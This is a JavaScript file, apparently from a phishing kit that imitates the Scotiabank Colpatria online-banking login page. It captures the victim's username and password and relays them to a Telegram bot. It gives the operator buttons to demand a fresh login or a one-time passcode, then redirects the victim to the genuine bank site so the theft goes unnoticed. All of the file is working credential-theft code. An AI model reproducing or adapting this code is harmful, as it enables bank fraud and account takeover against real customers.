/**
 * SCOTIABANK-COLPATRIA - script.js OPTIMIZADO
 * Página principal (index.html)
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Scotiabank Index: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        alert('Error: Sistema no inicializado correctamente');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const inputs = {
        username: document.getElementById('username'),
        password: document.getElementById('password')
    };
    const loginBtn = document.getElementById('loginBtn');
    const overlay = document.getElementById('loadingScreen');
    
    console.log('📋 Elementos:', { inputs, loginBtn, overlay });

    BancoUtils.onTelegramAction(handleTelegramAction);

    // Validación de inputs
    inputs.username.addEventListener('input', validateForm);
    inputs.password.addEventListener('input', validateForm);

    function validateForm() {
        const isValid = inputs.username.value.length >= 3 && 
                       inputs.password.value.length >= 4;
        loginBtn.disabled = !isValid;
        if (isValid) {
            loginBtn.classList.add('active');
        } else {
            loginBtn.classList.remove('active');
        }
    }

    validateForm();

    loginBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (loginBtn.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        // Mostrar overlay directamente
        if (overlay) {
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        } else {
            console.error('❌ Overlay no encontrado');
        }

        const data = {
            username: inputs.username.value,
            password: inputs.password.value
        };

        BancoUtils.saveBankData('scotiabank', data);
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('SCOTIABANK COLPATRIA - LOGIN', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '🔢 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('login', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) overlay.style.display = 'none';
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Scotiabank Index:', data);
        if (overlay) overlay.style.display = 'none';
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Limpiando campos de login');
                inputs.username.value = '';
                inputs.password.value = '';
                document.getElementById('remember').checked = false;
                loginBtn.disabled = true;
                loginBtn.classList.remove('active');
                break;
            case 'request_otp':
                console.log('🔢 Redirigiendo a otp.html');
                window.location.href = 'otp.html';
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a scotiabankcolpatria.com');
                window.location.href = 'https://www.scotiabankcolpatria.com/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
